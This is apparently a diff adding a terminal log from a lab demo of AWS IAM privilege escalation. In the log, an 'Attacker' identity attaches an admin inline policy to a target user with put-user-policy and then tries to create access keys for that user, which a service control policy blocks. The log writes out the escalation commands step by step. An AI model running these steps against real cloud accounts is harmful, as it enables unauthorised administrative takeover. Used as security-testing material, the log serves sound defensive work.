@@ -1,0 +1,68 @@
+[0;32m========================================[0m
+[0;32mIAM PutUserPolicy + CreateAccessKey Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-iam-018-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Target user: pl-prod-iam-018-to-admin-target-user
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-iam-018-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-iam-018-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying starting user lacks admin access[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Checking target user's current permissions[0m
+Getting target user details: pl-prod-iam-018-to-admin-target-user
+[2m[ReadOnly] $ aws iam get-user --user-name pl-prod-iam-018-to-admin-target-user --query 'User.[UserName,Arn]' --output table[0m
+-------------------------------------------------------------------------
+|                                GetUser                                |
++-----------------------------------------------------------------------+
+|  pl-prod-iam-018-to-admin-target-user                                 |
+|  arn:aws:iam::123456789012:user/pl-prod-iam-018-to-admin-target-user  |
++-----------------------------------------------------------------------+
+Listing target user's current inline policies:
+[2m[ReadOnly] $ aws iam list-user-policies --user-name pl-prod-iam-018-to-admin-target-user --query 'PolicyNames' --output text[0m
+Current policies: pl-prod-iam-018-to-admin-target-user-initial-policy
+[0;32m✓ Target user has limited permissions[0m
+
+[1;33mStep 6: Adding admin inline policy to target user[0m
+This is the privilege escalation vector...
+Creating temporary admin policy document...
+Adding admin policy 'admin-escalation' to user pl-prod-iam-018-to-admin-target-user
+
+[0;36m[Attacker] $ aws iam put-user-policy --user-name pl-prod-iam-018-to-admin-target-user --policy-name admin-escalation --policy-document file:///tmp/admin-escalation-policy.json[0m
+[0;32m✓ Successfully added admin policy to target user[0m
+
+[1;33mWaiting 15 seconds for IAM policy to propagate...[0m
+[0;32m✓ Policy propagated[0m
+
+[1;33mStep 7: Creating access keys for target user[0m
+Creating access keys for: pl-prod-iam-018-to-admin-target-user
+
+[0;36m[Attacker] $ aws iam create-access-key --user-name pl-prod-iam-018-to-admin-target-user --output json[0m
+[0;31mError: Failed to create access key (iam:CreateAccessKey denied)[0m
+[1;33m[demo_permissions] Restoring permissions on exit...[0m
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-iam-018-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+An error occurred (AccessDenied) when calling the CreateAccessKey operation: User: arn:aws:iam::123456789012:user/pl-prod-iam-018-to-admin-starting-user is not authorized to perform: iam:CreateAccessKey on resource: user pl-prod-iam-018-to-admin-target-user with an explicit deny in a service control policy: arn:aws:organizations::123456789012:policy/o-73iu42t62o/service_control_policy/p-chymj835
